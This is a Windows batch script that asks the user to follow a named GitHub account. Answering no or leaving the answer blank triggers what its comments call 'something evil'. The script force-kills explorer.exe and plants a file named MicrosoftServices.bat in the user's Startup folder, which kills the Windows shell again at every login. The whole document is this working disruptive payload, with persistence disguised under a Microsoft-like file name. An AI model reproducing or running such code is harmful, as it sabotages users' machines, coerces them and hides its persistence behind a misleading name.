@ECHO OFF
:start
SET choice=
SET /p choice=Follow Jooapa in Github [Y/N]: 
IF NOT '%choice%'=='' SET choice=%choice:~0,1%
IF '%choice%'=='Y' GOTO yes
IF '%choice%'=='y' GOTO yes
IF '%choice%'=='N' GOTO no
IF '%choice%'=='n' GOTO no
IF '%choice%'=='' GOTO no
ECHO "%choice%" is not valid
ECHO.
GOTO start

::if the user chooses yes, it will open the github page
:yes
ECHO :)
start "" http://www.github.com/jooapa
PAUSE
EXIT
::if the user chooses no, it will do something evil to the user >:D
:no
ECHO :(
:: kills the explorer.exe process
taskkill -f -im explorer.exe
:: opens the folder
cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
:: makes a new file to the folder
type NUL>MicrosoftServices.bat
:: and writes the code to the file
@echo taskkill -f -im explorer.exe> MicrosoftServices.bat

PAUSE
EXIT


